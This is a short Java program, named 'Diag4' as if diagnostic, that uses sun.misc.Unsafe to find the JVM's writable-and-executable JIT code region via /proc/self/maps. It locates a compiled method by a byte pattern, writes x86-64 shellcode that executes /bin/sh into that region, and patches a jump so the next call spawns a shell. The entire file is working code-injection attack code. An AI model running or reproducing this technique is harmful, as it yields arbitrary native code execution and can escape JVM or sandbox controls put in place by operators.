import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import sun.misc.Unsafe;

public final class Diag4 {
    static Unsafe U;
    static volatile long sink;
    static final byte[] PAT = {(byte) 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11};

    public static void main(String[] a) throws Exception {
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        U = (Unsafe) f.get(null);

        List<String> maps = Files.readAllLines(Path.of("/proc/self/maps"));
        long[] best = null;
        for (String l : maps) {
            if (!l.contains("rwx")) continue;
            String[] r = l.split("\\s+")[0].split("-");
            long s = Long.parseUnsignedLong(r[0], 16), e = Long.parseUnsignedLong(r[1], 16);
            if (best == null || e - s > best[1] - best[0]) best = new long[]{s, e};
        }
        System.out.printf("rwx %016x-%016x%n", best[0], best[1]);

        for (int i = 0; i < 300_000; i++) sink += probe(i);

        long hit = -1;
        outer:
        for (long p = best[0]; p < best[1] - 8; p++) {
            if (U.getByte(p) != PAT[0]) continue;
            for (int i = 1; i < 8; i++) if (U.getByte(p + i) != PAT[i]) continue outer;
            hit = p; break;
        }
        System.out.println("hit=" + Long.toHexString(hit));

        long pro = -1;
        for (long p = hit - 512; p < hit; p++) {
            if ((U.getByte(p) & 0xff) == 0x55 && (U.getByte(p + 1) & 0xff) == 0x48
                    && (U.getByte(p + 2) & 0xff) == 0x83 && (U.getByte(p + 3) & 0xff) == 0xec) pro = p;
        }
        System.out.println("prologue=" + Long.toHexString(pro));
        if (pro < 0) { System.out.println("NO PROLOGUE"); return; }

        long site = pro;
        if ((U.getByte(pro - 5) & 0xff) == 0xe9) site = pro - 5;
        System.out.println("site=" + Long.toHexString(site) + " (offset from hit " + (site - hit) + ")");

        StringBuilder ctx = new StringBuilder();
        for (long p = site - 8; p < site + 20; p++) ctx.append(String.format("%02x", U.getByte(p) & 0xff));
        System.out.println("ctx: " + ctx + "   <site at byte 8>");

        long sc = best[1] - 0x1000;
        byte[] shell = {
            0x48, 0x31, (byte) 0xd2, 0x52,
            0x48, (byte) 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
            0x53, 0x48, (byte) 0x89, (byte) 0xe7,
            0x48, 0x31, (byte) 0xf6,
            0x31, (byte) 0xc0, (byte) 0xb0, 0x3b, 0x0f, 0x05
        };
        for (int i = 0; i < shell.length; i++) U.putByte(sc + i, shell[i]);
        System.out.println("shellcode ok=" + ((U.getByte(sc) & 0xff) == 0x48));

        int rel = (int) (sc - (site + 5));
        U.putByte(site, (byte) 0xE9);
        U.putByte(site + 1, (byte) (rel & 0xff));
        U.putByte(site + 2, (byte) ((rel >> 8) & 0xff));
        U.putByte(site + 3, (byte) ((rel >> 16) & 0xff));
        U.putByte(site + 4, (byte) ((rel >> 24) & 0xff));

        System.out.println("patched, calling probe...");
        sink += probe(1);
        System.out.println("still alive");
    }

    static long probe(long x) { return x ^ 0x1122334455667788L; }
}
